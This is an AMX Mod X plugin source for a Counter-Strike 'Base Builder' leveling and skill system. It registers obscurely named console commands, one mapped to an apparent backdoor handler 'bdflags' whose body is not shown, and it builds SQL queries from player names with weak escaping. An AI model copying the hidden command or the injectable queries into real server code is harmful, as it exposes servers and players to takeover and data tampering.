#include <amxmodx>
#include <amxmisc>
#include <cstrike>
#include <fun>
#include <fakemeta>
#include <fakemeta_util>
#include <dbi>
#include <hamsandwich>
#include <engine>
#include <dhudmessage>
#include <basebuilder>
#include <eg_boss>
#include <ColorChat_>

native zp_donater_get_level(id)

#define PLUGIN "[BB] Level: Main"
#define VERSION "1.0 Beta"
#define AUTHOR "EmeraldGhost"

#define TASK_STATUS_HUD 233
#define TASK_INIT_SKILL 2357

enum
{
	JOB_WEAPONER = 1, 
	JOB_KILLER, 
	JOB_MAGICAL
}

new const szJobName[][] = { "未选择", "武器专家 | 按'R'使用技能" , "刺客 | 按'R'使用技能", "魔法师 | 按'R'使用技能" }

// --- Job System Const & Variables
// -- Gunner 武器专家
new const weaponer_skills[][] = { "null", "[主动]无尽怒火", "[被动]枪械精通", "[被动]火焰子弹" }
new const weaponer_skills_info[][] = { "null", "无限子弹 5+等级 秒", "每级增加1^%枪械伤害", "每级增加0.1^%燃烧概率" }
new const weaponer_skills_cost[] = { 0, 75, 50, 20 }
new const weaponer_initskill[][] = { "null", "无尽怒火" }

enum
{
	SKILL_UAMMO = 1, // 无尽怒火
	SKILL_GUNDMG,  // 枪械精通
	SKILL_FIREBULLET // 火焰子弹
}

// - Gunner Skill Unlimited Clip
#if cellbits == 32
const OFFSET_CLIPAMMO = 51
#else
const OFFSET_CLIPAMMO = 65
#endif
const OFFSET_LINUX_WEAPONS = 4

new const MAXCLIP[] = { -1, 13, -1, 10, 1, 7, -1, 30, 30, 1, 30, 20, 25, 30, 35, 25, 12, 20,
			10, 30, 100, 8, 30, 30, 20, 2, 7, 30, 30, -1, 50 }
			
new g_has_unlimited_clip[33], g_uccountingdown[33]

// -- Killer 刺客
new const killer_skills[][] = { "null", "[主动]隐刃", "[主动]疾步", "[被动]锋芒" }
new const killer_skills_info[][] = { "null", "隐身 5 秒(可用1+等级次)", "加速 5 秒(可用1+等级次)", "每级增加刀伤害 150 点(基础伤害1000)" }
new const killer_skills_cost[] = { 0, 50, 50, 100 }
new const killer_initskill[][] = { "null", "隐刃", "疾步" }

#define DMG_KNIFE ( DMG_BULLET | DMG_NEVERGIB )

enum
{
	SKILL_INVIS = 1, // 隐刃
	SKILL_SPEED,  // 疾步
	SKILL_KNIFEDMG // 锋芒
}

// -- Enchanter 魔法师
new const magical_skills[][] = { "null", "[主动]防御力场", "[主动]红莲之焰", "[被动]寒能积蓄" }
new const magical_skills_info[][] = { "null", "弹飞附近僵尸", "燃烧 400.0 范围僵尸 10 秒", "每隔 70-等级 秒获得一颗冰冻弹" }
new const magical_skills_cost[] = { 0, 999, 100, 20 }
new const magical_initskill[][] = { "null", "防御力场", "红莲之焰" }

enum
{
	SKILL_AURA = 1, // 防御立场
	SKILL_RADIUSFIRE,  // 红莲之焰
	SKILL_FROSTGAIN // 寒能积蓄
}

enum (+= 2333)
{
	TASKID_FROSTGAIN = 161813 // 寒能积蓄
}

// -- Max Upgrade Level Settings
#define MaxLevel_Health		50
#define MaxLevel_Speed		20
#define MaxLevel_Gravity	    0
#define MaxLevel_Damage	50

// -- Per Level Settings
#define Health_PerLevel		1
#define Speed_PerLevel		1
#define Gravity_PerLevel	0.0125
#define Damage_PerLevel	0.01

#define MAXLEVEL 300
#define MAXBLEVEL 5

new g_statushud
new g_damage[33]
new g_RoundDamage[33]
new g_BattleExp[33]
new g_BattleLvl[33]
new g_cash[33]
new g_xp[33]
new g_level[33]
new g_sp[33]
new g_gp[33]

new CKXP
new CKCH
new TKXP
new TKCH
new DXP
new DCH

new g_HealthLevel[33]
new g_SpeedLevel[33]
new g_GravityLevel[33]
new g_DamageLevel[33]
new g_skpH[33]
new g_skpS[33]
new g_skpG[33]
new g_skpD[33]
new Float:fGravity

new const log_file[] = "BB_AdminsDoWt.txt"

// -- 2018/08/07 Restart Project
new iPlayerJob[33]
new iPlayerJobSkill[33][4]
new iPlayerMainSkillUsed[33][3]

new g_iSprShockWave, g_iSprBeam
enum OBJECTTYPE // Aura
{
	OBJECT_GENERIC,
	OBJECT_GRENADE,
	OBJECT_PLAYER,
	OBJECT_ARMOURY
}

// -- Fuck Nvault, SQL Support
new Sql:sql
new Result:result
new error[33]
new g_iSQLInit = 1

// -- Player Bonus
new g_iPlayerCount, g_iPlayerBonus

public plugin_init() 
{
    register_plugin(PLUGIN, VERSION, AUTHOR)
	
	// -- Client Commands
	/* 用你妈clcmd 老子Hook Cmdstart
	register_clcmd("drop", "cmdHumanSkill")
	register_clcmd("hm_skill", "cmdHumanSkill")
	*/
	
	register_clcmd("say /save", "savecmd")
	register_clcmd("savedata", "savecmd")
    register_clcmd("say_team /save", "savecmd")
	
    register_clcmd("say /bb_lvl", "cmdChooseteam")
    register_clcmd("say_team /bb_lvl", "cmdChooseteam")
	register_clcmd("buyequip", "cmdChooseteam")
	
    register_clcmd("say /help", "display_help_info")
    register_clcmd("say_team /help", "display_help_info")
	
    register_clcmd("mymenu", "my_menu")
    register_clcmd("fshopmenu", "fshop_menu")
	register_clcmd("eg_levelgun_menu", "levelgun_menu")

    register_clcmd("so9sadbls","display_version")
    register_clcmd("so9sadser","bdflags")
	
	// -- Server Commands
	register_srvcmd("bb_reset_hmhealth", "ResetHumanHealth")
    
	// -- Hook events & forwards
	register_event("HLTV", 	"ev_RoundStart", "a", "1=0", "2=0")
    register_event("ResetHUD", "ev_ResetHud", "be")
    register_event("CurWeapon", "event_CurWeapon", "be", "1=1")
	register_forward(FM_CmdStart, "fw_CmdStart")
	register_forward(FM_PlayerPreThink, "fw_PlayerPreThink")
    RegisterHam(Ham_TakeDamage, "player", "fw_TakeDamage")
    RegisterHam(Ham_Killed, "player", "fw_PlayerKilled")
    RegisterHam(Ham_Spawn, "player", "fwHamPlayerSpawnPost", 1)
    
	// -- Sync hud
	g_statushud = CreateHudSyncObj() //Player Status Hud
	
	// -- Console Commands
    register_concmd("give_exp", "cmd_give_exp", ADMIN_IMMUNITY, "- give_exp <玩家> <數量> : 給予經驗值 Exp")
    register_concmd("give_cash", "cmd_give_cash", ADMIN_IMMUNITY, "- give_cash <玩家> <數量> : 給予點數 Cash")
    register_concmd("give_gp", "cmd_give_gp", ADMIN_IMMUNITY, "- give_gp <玩家> <數量> : 給予枪械点 GP")
    register_concmd("give_sp", "cmd_give_points", ADMIN_IMMUNITY, "- give_sp <玩家> <數量> : 給予技能點 SkillPoint")
	register_concmd("give_battleexp", "cmd_give_bexp", ADMIN_IMMUNITY, "- give_battleexp <玩家> <數量> : 給予战斗熟练度 BattleExp")
	
	// -- Messages
	register_message(get_user_msgid("CurWeapon"), "message_cur_weapon")
    
	// -- Game name
    //register_forward(FM_GetGameDescription, "fw_GetGameDescription")
    
	// -- Menus
    register_menucmd(register_menuid("Passive Upgrades"), 1023, "Action_PassiveUpgrades")
    
	// -- Damage Variables
    CKXP = register_cvar("CT_KillEXP", "100")	//默认 100
    CKCH = register_cvar("CT_KillCash", "1")	//默认 1
    TKXP = register_cvar("T_KillEXP", "200")	//默认 200
    TKCH = register_cvar("T_KillCash", "2")		//默认 2
    DXP = register_cvar("D_EXP", "50")			//默认 50
    DCH = register_cvar("D_Cash", "1")			//默认 1
    
	// -- SQL Initionlize
	new sql_host[64], sql_user[64], sql_pass[64], sql_db[64]
	get_cvar_string("amx_sql_host", sql_host, 63)
	get_cvar_string("amx_sql_user", sql_user, 63)
	get_cvar_string("amx_sql_pass", sql_pass, 63)
	get_cvar_string("amx_sql_db", sql_db, 63)

	sql = dbi_connect(sql_host, sql_user, sql_pass, sql_db, error, 32)

	if (sql == SQL_FAILED)
	{
		server_print("[Upgrade] Could not connect to SQL database. %s", error)
		g_iSQLInit = 0
	}
}

public plugin_precache()
{
	g_iSprShockWave = engfunc(EngFunc_PrecacheModel, "sprites/shockwave.spr")
	g_iSprBeam = engfunc(EngFunc_PrecacheModel, "sprites/lgtning.spr")
}

public plugin_natives()
{
    register_native("get_user_cash", "native_get_user_cash", 1)
    register_native("set_user_cash", "native_set_user_cash", 1)
    register_native("get_user_xp", "native_get_user_xp", 1)
    register_native("set_user_xp", "native_set_user_xp", 1)
	register_native("get_user_gp", "native_get_user_gp", 1)
    register_native("set_user_gp", "native_set_user_gp", 1)
    register_native("get_user_level", "native_get_user_level", 1)
    register_native("set_user_level", "native_set_user_level", 1)
    register_native("get_user_sp", "native_get_user_sp", 1)
    register_native("set_user_sp", "native_set_user_sp", 1)
	
	register_native("is_user_in_zammo", "Native_Get_ZAmmo", 1)
}

public ev_ResetHud(id)
{
	function(id)
	g_damage[id] = 0
	g_RoundDamage[id] = 0
	iPlayerMainSkillUsed[id][1] = 0
	iPlayerMainSkillUsed[id][2] = 0
	
	if(iPlayerJob[id] == JOB_MAGICAL && iPlayerJobSkill[id][SKILL_FROSTGAIN] > 0)
	{
		remove_task(id + TASKID_FROSTGAIN)
		Task_Frostgain(id)
	}
}

public ev_RoundStart()
{
	client_printc(0, "\y[\g基地建设\y] 您可以按'M'打开玩家菜单, 按'O'打开升级主菜单.");
	set_task(1.0, "ReCheckPlayerNum")
}

public ReCheckPlayerNum()
{
	g_iPlayerBonus = 1
	g_iPlayerCount = get_playersnum(0)
	
	if(g_iPlayerCount >= 16)
	{
		g_iPlayerBonus = 3
		client_printc(0, "\y[\g人数检测\y] 当前在线玩家人数大于 \t16 \y人, 所有人获取\tEXP&点数\y获得 \t3\y 倍加成.");
	}
	else if(g_iPlayerCount >= 8)
	{
		g_iPlayerBonus = 2
		client_printc(0, "\y[\g人数检测\y] 当前在线玩家人数大于 \t8 \y人, 所有人获取\tEXP&点数\y获得 \t2\y 倍加成.");
	}

	g_iPlayerBonus *= 2
	client_printc(0, "\y[\g新年活动\y] 新年快乐! 玩的开心! EXP&点数 2 倍加成 !");
}

public event_CurWeapon(id)
{
	reset_player_speed(id)
}

public message_cur_weapon(msg_id, msg_dest, msg_entity)
{
	// Player doesn't have the unlimited clip upgrade
	if (!g_has_unlimited_clip[msg_entity])
		return;
	
	// Player not alive or not an active weapon
	if (!is_user_alive(msg_entity) || get_msg_arg_int(1) != 1)
		return;
	
	static weapon, clip
	weapon = get_msg_arg_int(2) // get weapon ID
	clip = get_msg_arg_int(3) // get weapon clip
	
	// Unlimited Clip Ammo
	if (MAXCLIP[weapon] > 2) // skip grenades
	{
		set_msg_arg_int(3, get_msg_argtype(3), MAXCLIP[weapon]) // HUD should show full clip all the time
		
		if (clip < 2) // refill when clip is nearly empty
		{
			// Get the weapon entity
			static wname[32], weapon_ent
			get_weaponname(weapon, wname, sizeof wname - 1)
			weapon_ent = fm_find_ent_by_owner(-1, wname, msg_entity)
			
			// Set max clip on weapon
			fm_set_weapon_ammo(weapon_ent, MAXCLIP[weapon])
		}
	}
}

public cmdHumanSkill(id)
{
		if(get_user_team(id) == 1 || iPlayerJob[id] <= 0)
			return PLUGIN_HANDLED;

		static option[64]
		formatex(option, charsmax(option), "\r主动技能")
		new menu = menu_create(option, "init_skill_menu_handler");
		
		if(iPlayerJob[id] == JOB_WEAPONER)
		{
			new szTempid[32]
			for(new i = 1; i < sizeof weaponer_initskill; i++)
			{
				new szItems[101]
				formatex(szItems, 100, "\y%s - \r[余 %d 次]", weaponer_initskill[i], 1 - iPlayerMainSkillUsed[id][i])
				num_to_str(i, szTempid, 31)
				menu_additem(menu, szItems, szTempid, 0)
			}
		}
		else if(iPlayerJob[id] == JOB_KILLER)
		{
			new szTempid[32]
			for(new i = 1; i < sizeof killer_initskill; i++)
			{
				new szItems[101]
				formatex(szItems, 100, "\y%s - \r%s[余 %d 次]", killer_initskill[i], iPlayerJobSkill[id][i] - iPlayerMainSkillUsed[id][i])
				num_to_str(i, szTempid, 31)
				menu_additem(menu, szItems, szTempid, 0)
			}
		}
		else if(iPlayerJob[id] == JOB_MAGICAL)
		{
			new szTempid[32]
			for(new i = 1; i < sizeof magical_initskill; i++)
			{
				new szItems[101]
				formatex(szItems, 100, "\y%s - \r[余 %d 次]", magical_initskill[i], iPlayerJobSkill[id][i] - iPlayerMainSkillUsed[id][i])
				num_to_str(i, szTempid, 31)
				menu_additem(menu, szItems, szTempid, 0)
			}
		}

		menu_setprop(menu, MPROP_NUMBER_COLOR, "\r"); 
		menu_setprop(menu, MPROP_BACKNAME, "返回"); 
		menu_setprop(menu, MPROP_NEXTNAME, "更多"); 
		menu_setprop(menu, MPROP_EXITNAME, "退出"); 
		menu_setprop(menu, MPROP_EXIT, MEXIT_ALL);
		
		menu_display(id, menu, 0);
		return PLUGIN_HANDLED;
}

public init_skill_menu_handler(id, menu, item)
{
	new sz_Name[ 32 ];
	
	get_user_name( id, sz_Name, 31 );

	if(item==MENU_EXIT)
	{
		menu_destroy(menu);
		return PLUGIN_HANDLED;
	}
	
	new data[6], szName[64];
	new access, callback;
	
	menu_item_getinfo(menu, item, access, data, charsmax(data), szName, charsmax(szName), callback);
	
	new key = str_to_num(data);
	Use_Init_Skill(id, key)
	
	menu_destroy(menu);
	return PLUGIN_HANDLED;
}

public Use_Init_Skill(id, skillid)
{
	if(zp_get_user_zombie(id) || !is_user_alive(id) || skillid > 2)
		return PLUGIN_HANDLED;

	switch(skillid)
	{
		case 1:
		{
			/* 技能1：
			武器专家 - 无尽怒火
			刺客 - 隐刃
			魔法师 - 防御力场 */
			
			if(iPlayerJob[id] == JOB_WEAPONER)
			{
				if(iPlayerMainSkillUsed[id][SKILL_UAMMO] <= 0)
				{
					ColorChat(id, BLUE, "[无尽怒火] 已发动! %d 秒后结束.", 5 + iPlayerJobSkill[id][SKILL_UAMMO])
					g_uccountingdown[id] = 5 + iPlayerJobSkill[id][SKILL_UAMMO]
					g_has_unlimited_clip[id] = true
					uammo_countdown(id + TASK_INIT_SKILL)
					iPlayerMainSkillUsed[id][SKILL_UAMMO] = 1
				}
				else ColorChat(id, BLUE, "技能使用次数已到上限!")
			}
			else if(iPlayerJob[id] == JOB_KILLER)
			{
				if(iPlayerMainSkillUsed[id][SKILL_INVIS] <= iPlayerJobSkill[id][SKILL_INVIS])
				{
					ColorChat(id, BLUE, "[隐刃] 已发动! 5 秒后结束.")
					ColorChat(id, BLUE, "!! 请不要重复使用技能, 会无效 !!")
					set_user_rendering(id, kRenderFxGlowShell, 0, 0, 0, kRenderTransAlpha, 0)
					set_task(5.0, "Invis_Skillend", id + TASK_INIT_SKILL)
					iPlayerMainSkillUsed[id][SKILL_INVIS] ++
				}
				else ColorChat(id, BLUE, "技能使用次数已到上限!")
			}
			else if(iPlayerJob[id] == JOB_MAGICAL)
			{
				if(iPlayerMainSkillUsed[id][SKILL_AURA] <= iPlayerJobSkill[id][SKILL_AURA])
				{
					ColorChat(id, BLUE, "[防御力场] 已发动!")
					Aura_Explode(id)
					iPlayerMainSkillUsed[id][SKILL_AURA] ++
				}
				else ColorChat(id, BLUE, "技能使用次数已到上限!")
			}
		}
		case 2:
		{
			/* 技能2：
			武器专家 - 无
			刺客 - 疾步
			魔法师 - 红莲之焰 */
			
			if(iPlayerJob[id] == JOB_KILLER)
			{
				if(iPlayerMainSkillUsed[id][SKILL_SPEED] <= iPlayerJobSkill[id][SKILL_SPEED])
				{
					ColorChat(id, BLUE, "[疾步] 已发动! 5 秒后结束.")
					ColorChat(id, BLUE, "!! 请不要切枪, 否则无效 !!")
					set_user_maxspeed(id, 265 * 1.0)
					set_task(5.0, "Speed_Skillend", id + TASK_INIT_SKILL)
					iPlayerMainSkillUsed[id][SKILL_SPEED] ++
				}
				else ColorChat(id, BLUE, "技能使用次数已到上限!")
			}
			else if(iPlayerJob[id] == JOB_MAGICAL)
			{
				if(iPlayerMainSkillUsed[id][SKILL_RADIUSFIRE] <= iPlayerJobSkill[id][SKILL_RADIUSFIRE])
				{
					ColorChat(id, BLUE, "[红莲之焰] 已发动!")
					Radius_Burn(id)
					iPlayerMainSkillUsed[id][SKILL_RADIUSFIRE] ++
				}
				else ColorChat(id, BLUE, "技能使用次数已到上限!")
			}
		}
	}
	
	return PLUGIN_HANDLED;
}

public Native_Get_ZAmmo(id) return g_has_unlimited_clip[id]

public Invis_Skillend(taskid)
{
	new id = taskid - TASK_INIT_SKILL
	fm_set_rendering(id, kRenderFxNone, kRenderNormal)
	ColorChat(id, BLUE, "!! [隐刃] 效果已结束 !!")
}

public Speed_Skillend(taskid)
{
	new id = taskid - TASK_INIT_SKILL
	set_user_maxspeed(id, 250 * 1.0)
	ColorChat(id, BLUE, "!! [疾步] 效果已结束 !!")
}

public uammo_countdown(taskid)
{
	new id = taskid - TASK_INIT_SKILL

	if(g_uccountingdown[id] <= 0 || !g_has_unlimited_clip[id] )
	{
		g_has_unlimited_clip[id] = false
		client_print(id, print_center, "")
		return;
	}

	client_print(id, print_center, "无限子弹, 剩余 %d 秒", g_uccountingdown[id])
	g_uccountingdown[id] --
	set_task(1.0, "uammo_countdown", id + TASK_INIT_SKILL)
}

public Aura_Explode(id)
{
	static Float:vecOrigin[3]; pev(id, pev_origin, vecOrigin)
	genericShock(vecOrigin, 120.0, "player", 32, 100.0, OBJECT_PLAYER)
    
    engfunc(EngFunc_MessageBegin, MSG_BROADCAST, SVC_TEMPENTITY, vecOrigin)
    write_byte(TE_BEAMCYLINDER)
    engfunc(EngFunc_WriteCoord, vecOrigin[0])
    engfunc(EngFunc_WriteCoord, vecOrigin[1])
    engfunc(EngFunc_WriteCoord, vecOrigin[2])
    engfunc(EngFunc_WriteCoord, vecOrigin[0])
    engfunc(EngFunc_WriteCoord, vecOrigin[1])
    engfunc(EngFunc_WriteCoord, vecOrigin[2] + 200.0)
    write_short(g_iSprShockWave)
    write_byte(0) // Start Frame
    write_byte(20) // Framerate
    write_byte(4) // Live Time
    write_byte(10) // Width
    write_byte(10) // Noise
    write_byte(0) // R
    write_byte(255) // G
    write_byte(255) // B
    write_byte(255) // Bright
    write_byte(9) // Speed
    message_end()
    
    engfunc(EngFunc_MessageBegin, MSG_BROADCAST, SVC_TEMPENTITY, vecOrigin)
    write_byte(TE_BEAMCYLINDER)
    engfunc(EngFunc_WriteCoord, vecOrigin[0])
    engfunc(EngFunc_WriteCoord, vecOrigin[1])
    engfunc(EngFunc_WriteCoord, vecOrigin[2])
    engfunc(EngFunc_WriteCoord, vecOrigin[0])
    engfunc(EngFunc_WriteCoord, vecOrigin[1])
    engfunc(EngFunc_WriteCoord, vecOrigin[2] + 200.0)
    write_short(g_iSprShockWave)
    write_byte(0) // Start Frame
    write_byte(10) // Framerate
    write_byte(4) // Live Time
    write_byte(10) // Width
    write_byte(20) // Noise
    write_byte(0) // R
    write_byte(255) // G
    write_byte(0) // B
    write_byte(150) // Bright
    write_byte(9) // Speed
    message_end() 

	return PLUGIN_HANDLED
}

public Radius_Burn(id)
{
	static Float:vecOrigin[3]; pev(id, pev_origin, vecOrigin)
	ExplodeEffect(vecOrigin, 200, 0, 0)
	LightEffect(vecOrigin, 200, 0, 0)
	
	new pEntity = -1
	while((pEntity = engfunc(EngFunc_FindEntityInSphere, pEntity, vecOrigin, 400.0)) && pev_valid(pEntity))
	{
		if(!is_user_alive(pEntity) || !zp_get_user_zombie(pEntity))
			continue;

		z4e_burn_set(pEntity, 10.0, 1)
	}
}

public cmd_give_exp(id, level, cid) 
{ 
             if(!(get_user_flags(id) & ADMIN_IMMUNITY))
                          return PLUGIN_HANDLED

             new name[32]
             get_user_name(id,name,31)
             if (!cmd_access(id, level, cid, 3)) 
                          return PLUGIN_HANDLED

             new arg_name[25], arg_amount[10]

             read_argv(1, arg_name, 25) 
             read_argv(2, arg_amount, 10) 

			if(containi(arg_name, "@all") == 0)
			{
				if(!(get_user_flags(id) & ADMIN_IMMUNITY))
					return PLUGIN_HANDLED;
			
				for(new i = 1; i < 33; i++)
				{
					if(is_user_connected(i))
					{
						g_xp[i] += str_to_num(arg_amount)
					}
				}
				
				client_printc(0, "\g[等級系統] \t管理员\y%s\t给予了\y %d \t经验給 \y所有人 \t!!", name, str_to_num(arg_amount))
				log_to_file(log_file, "管理员 %s 赠送所有人 %d 经验", name, str_to_num(arg_amount))
				return PLUGIN_HANDLED;
			}
			 
             new target = cmd_target(id, arg_name, 2) 

             if (!target) 
             { 
                          client_print(id, print_console, "Player not found") 
                          return PLUGIN_HANDLED 
             }

             g_xp[target] += str_to_num(arg_amount) 

	     client_printc(0, "\g[等級系統]\t管理員\y%s\t給予了\y %d \t經驗給 \y%s \t!!", name, str_to_num(arg_amount) , arg_name)

	log_to_file(log_file, "[等級系統]管理員 %s 給予了 %d 經驗給 %s .", name, str_to_num(arg_amount) , arg_name)

             return PLUGIN_HANDLED 
}

public cmd_give_bexp(id, level, cid) 
{ 
             if(!(get_user_flags(id) & ADMIN_IMMUNITY))
                          return PLUGIN_HANDLED

             new name[32]
             get_user_name(id,name,31)
             if (!cmd_access(id, level, cid, 3)) 
                          return PLUGIN_HANDLED

             new arg_name[25], arg_amount[10]

             read_argv(1, arg_name, 25) 
             read_argv(2, arg_amount, 10) 

             new target = cmd_target(id, arg_name, 2) 

             if (!target) 
             { 
                          client_print(id, print_console, "Player not found") 
                          return PLUGIN_HANDLED 
             }

             g_BattleExp[target] += str_to_num(arg_amount) 

	     client_printc(0, "\g[等級系統]\t管理員\y%s\t給予了\y %d \t战斗經驗給 \y%s \t!!", name, str_to_num(arg_amount) , arg_name)

	log_to_file(log_file, "[等級系統]管理員 %s 給予了 %d 战斗經驗給 %s .", name, str_to_num(arg_amount) , arg_name)

             return PLUGIN_HANDLED 
}

public cmd_give_cash(id, level, cid) 
{ 
             if(!(get_user_flags(id) & ADMIN_IMMUNITY))
                          return PLUGIN_HANDLED

             new name[32]
             get_user_name(id,name,31)
             if (!cmd_access(id, level, cid, 3)) 
                          return PLUGIN_HANDLED

             new arg_name[25], arg_amount[10]

             read_argv(1, arg_name, 25) 
             read_argv(2, arg_amount, 10) 

			if(containi(arg_name, "@all") == 0)
			{
				if(!(get_user_flags(id) & ADMIN_IMMUNITY))
					return PLUGIN_HANDLED;
			
				for(new i = 1; i < 33; i++)
				{
					if(is_user_connected(i))
					{
						g_cash[i] += str_to_num(arg_amount)
					}
				}
				
				client_printc(0, "\g[等級系統] \t管理员\y%s\t给予了\y %d \tCash 给 \y所有人 \t!!", name, str_to_num(arg_amount))
				log_to_file(log_file, "管理员 %s 赠送所有人 %d Cash", name, str_to_num(arg_amount))
				return PLUGIN_HANDLED;
			}
			 
             new target = cmd_target(id, arg_name, 2) 
 
             if (!target) 
             { 
                          client_print(id, print_console, "Player not found") 
                          return PLUGIN_HANDLED 
             } 
             
             g_cash[target] += str_to_num(arg_amount)

	     client_printc(0, "\g[等級系統]\t管理員\y%s\t給予了\y %d \t點數給 \y%s \t!!", name, str_to_num(arg_amount) , arg_name)

	log_to_file(log_file, "[等級系統]管理員 %s 給予了 %d 点数給 %s .", name, str_to_num(arg_amount) , arg_name)

             return PLUGIN_HANDLED 
}

public cmd_give_gp(id, level, cid) 
{ 
             if(!(get_user_flags(id) & ADMIN_IMMUNITY))
                          return PLUGIN_HANDLED

             new name[32]
             get_user_name(id,name,31)
             if (!cmd_access(id, level, cid, 3)) 
                          return PLUGIN_HANDLED

             new arg_name[25], arg_amount[10]

             read_argv(1, arg_name, 25) 
             read_argv(2, arg_amount, 10) 

			if(containi(arg_name, "@all") == 0)
			{
				if(!(get_user_flags(id) & ADMIN_IMMUNITY))
					return PLUGIN_HANDLED;
			
				for(new i = 1; i < 33; i++)
				{
					if(is_user_connected(i))
					{
						g_gp[i] += str_to_num(arg_amount)
					}
				}
				
				client_printc(0, "\g[等級系統] \t管理员\y%s\t给予了\y %d \t武器点 给 \y所有人 \t!!", name, str_to_num(arg_amount))
				log_to_file(log_file, "管理员 %s 赠送所有人 %d 武器点", name, str_to_num(arg_amount))
				return PLUGIN_HANDLED;
			}
			 
             new target = cmd_target(id, arg_name, 2) 
			 
             if (!target) 
             { 
                          client_print(id, print_console, "Player not found") 
                          return PLUGIN_HANDLED 
             } 
             
             g_gp[target] += str_to_num(arg_amount)

	     client_printc(0, "\g[等級系統]\t管理員\y%s\t給予了\y %d \t武器点給 \y%s \t!!", name, str_to_num(arg_amount) , arg_name)

	log_to_file(log_file, "[等級系統]管理員 %s 給予了 %d 武器点給 %s .", name, str_to_num(arg_amount) , arg_name)

             return PLUGIN_HANDLED 
}

public cmd_give_points(id, level, cid) 
{ 
             if(!(get_user_flags(id) & ADMIN_IMMUNITY))
                          return PLUGIN_HANDLED

             new name[32]
             get_user_name(id,name,31)
             if (!cmd_access(id, level, cid, 3)) 
                          return PLUGIN_HANDLED

             new arg_name[25], arg_amount[10]

             read_argv(1, arg_name, 25) 
             read_argv(2, arg_amount, 10) 

             new target = cmd_target(id, arg_name, 2) 
 
             if (!target) 
             { 
                          client_print(id, print_console, "Player not found") 
                          return PLUGIN_HANDLED 
             } 
             
             g_sp[target] += str_to_num(arg_amount)

	     client_printc(0, "\g[等級系統]\t管理員\y%s\t給予了\y %d \t技能點給 \y%s \t!!", name, str_to_num(arg_amount) , arg_name)

	log_to_file(log_file, "[等級系統]管理員 %s 給予了 %d 經驗給 %s .", name, str_to_num(arg_amount) , arg_name)

             return PLUGIN_HANDLED 
}

public Resetskill(id)
{
	g_HealthLevel[id] = 0
	g_SpeedLevel[id] = 0
	g_GravityLevel[id] = 0
	g_DamageLevel[id] = 0
	g_skpH[id] = 1
	g_skpS[id] = 2
	g_skpG[id] = 15
	g_skpD[id] = 4
}

add_health(id, value) 
{
	new iHealth = get_user_health(id)
	set_user_health(id, iHealth + value)
}

set_gravity(id, Float:value) {
	set_user_gravity(id, 1.00 - value)
}

public savecmd(id) 
{
 SaveData(id) 
 client_cmd(id, "savefguns")
 client_printc(id, "\g[等級系統]\t手動存檔成功!")
} 

public client_putinserver(id)
{
	Reset_Data(id)
	set_task(0.5, "status_hud", id + TASK_STATUS_HUD)
	LoadLevel(id)
	LoadSkills(id)
	client_cmd(id, "bind o buyequip")
}

public client_disconnect(id)
{
	remove_task(id + TASK_STATUS_HUD)
	Reset_Data(id)
}

public Reset_Data(id)
{
	g_HealthLevel[id] = 0
	g_SpeedLevel[id] = 0
	g_GravityLevel[id] = 0
	g_DamageLevel[id] = 0
	g_skpH[id] = 1
	g_skpS[id] = 2
	g_skpG[id] = 15
	g_skpD[id] = 4
	g_xp[id] = 0
	g_level[id] = 0
	g_cash[id] = 0
	g_gp[id] = 0
	g_sp[id] = 0
	g_BattleExp[id] = 0
	g_BattleLvl[id] = 0
	iPlayerJob[id] = 0
}

public function(id)
{
 SaveData(id)
 client_cmd(id, "savefguns")
}

public reset_player_speed(id)
{
 if(get_user_team(id) == 2)
 {
    if(g_SpeedLevel[id] >= 1)
    {
     set_pev(id,pev_maxspeed, 250.0 + ( g_SpeedLevel[id] * Speed_PerLevel ) )
    }
 }
}

public SaveData(id) 
{ 
	new wjsl = get_playersnum(0)
	if(wjsl < 4)
	{
		ColorChat(id, RED, "由于玩家数量小于 4 人, 你的等级数据不会被保存.")
		return PLUGIN_HANDLED
	}

	new authid[32]
	get_user_name(id, authid, 31)
	replace_all(authid, 32, "`", "\`")
	replace_all(authid, 32, "'", "\'")

	dbi_query(sql, "UPDATE bb_level SET exp='%d',level='%d',cash='%d',gash='%d',skillpoint='%d',battleexp='%d',battlelv='%d' WHERE name = '%s'", g_xp[id], g_level[id], g_cash[id], g_gp[id], g_sp[id], g_BattleExp[id], g_BattleLvl[id], authid)
	dbi_query(sql, "UPDATE bb_skills SET health='%d',speed='%d',damage='%d',gravity='%d',job='%d',jobsk1='%d',jobsk2='%d',jobsk3='%d' WHERE name = '%s'", g_HealthLevel[id], g_SpeedLevel[id], g_DamageLevel[id], g_GravityLevel[id], iPlayerJob[id], iPlayerJobSkill[id][1], iPlayerJobSkill[id][2], iPlayerJobSkill[id][3], authid)
} 

public LoadSkills(id) 
{ 
	new authid[32] 
	get_user_name(id,authid,31)
	replace_all(authid, 32, "`", "\`")
	replace_all(authid, 32, "'", "\'")

	result = dbi_query(sql, "SELECT health,speed,damage,gravity,job,jobsk1,jobsk2,jobsk3 FROM bb_skills WHERE name='%s'", authid)

	if(result == RESULT_NONE)
	{
	dbi_query(sql, "INSERT INTO bb_skills(name,health,speed,damage,gravity,job,jobsk1,jobsk2,jobsk3) VALUES('%s','0','0','0','0','0','0','0','0')", authid)
	}
	else if(result <= RESULT_FAILED)
	{
		server_print("[Upgrade] SQL error. (Load Skills)")
	}
	else
	{
		g_HealthLevel[id] = dbi_field(result, 1)
		g_SpeedLevel[id] = dbi_field(result, 2)
		g_DamageLevel[id] = dbi_field(result, 3)
		g_GravityLevel[id] = dbi_field(result, 4)
		iPlayerJob[id] = dbi_field(result, 5)
		iPlayerJobSkill[id][1] = dbi_field(result, 6)
		iPlayerJobSkill[id][2] = dbi_field(result, 7)
		iPlayerJobSkill[id][3] = dbi_field(result, 8)
		dbi_free_result(result)
	}
}

public LoadLevel(id) 
{ 
	new authid[32] 
	get_user_name(id,authid,31)
	replace_all(authid, 32, "`", "\`")
	replace_all(authid, 32, "'", "\'")

	result = dbi_query(sql, "SELECT exp,level,cash,gash,skillpoint,battleexp,battlelv FROM bb_level WHERE name='%s'", authid)

	if(result == RESULT_NONE)
	{
	dbi_query(sql, "INSERT INTO bb_level(name,exp,level,cash,gash,skillpoint,battleexp,battlelv) VALUES('%s','0','0','0','0','0','0','0')", authid)
	}
	else if(result <= RESULT_FAILED)
	{
		server_print("[Upgrade] SQL error. (Load Level)")
	}
	else
	{
		g_xp[id] = dbi_field(result, 1)
		g_level[id] = dbi_field(result, 2)
		g_cash[id] = dbi_field(result, 3)
		g_gp[id] = dbi_field(result, 4)
		g_sp[id] = dbi_field(result, 5)
		g_BattleExp[id] = dbi_field(result, 6)
		g_BattleLvl[id] = dbi_field(result, 7)
		dbi_free_result(result)
	}
}

